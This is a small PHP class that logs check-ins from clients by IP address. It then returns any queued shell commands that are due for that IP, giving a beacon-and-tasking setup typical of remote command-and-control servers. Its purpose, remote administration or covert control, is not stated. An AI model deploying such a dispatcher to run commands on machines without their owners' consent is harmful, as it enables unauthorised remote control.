<?php

/**
 * @author Ammar Faizi <ammarfaizi2@gmail.com> https://www.facebook.com/ammarfaizi2
 * @license MIT
 * @version 0.0.1
 */
final class Ping
{
	/**
	 * Constructor.
	 */
	public function __construct()
	{
		$this->run();
	}

	public function run(): void
	{
		$handle = fopen(sprintf("%s/logs/{$_SERVER["REMOTE_ADDR"]}.log", STORAGE_PATH), "a");
		fwrite($handle, sprintf("%s\t%s\n", dechex(time()), "ping"));
		fclose($handle);

		foreach(glob(STORAGE_PATH."/queue/shell_cmd/{$_SERVER["REMOTE_ADDR"]}___*") as $file) {
			$a = json_decode(file_get_contents($file), true);
			if (isset($a["due"], $a["cmd"])) {
				if ($a["due"] <= time()) {
					$time = time();
					$basename = basename($file);
					rename($file, STORAGE_PATH."/queue/shell_cmd/dispatched/{$basename}.{$time}.dis");
					print json_encode(["shell_cmd" => $a["cmd"]]);
				}
			}
		}
	}
}
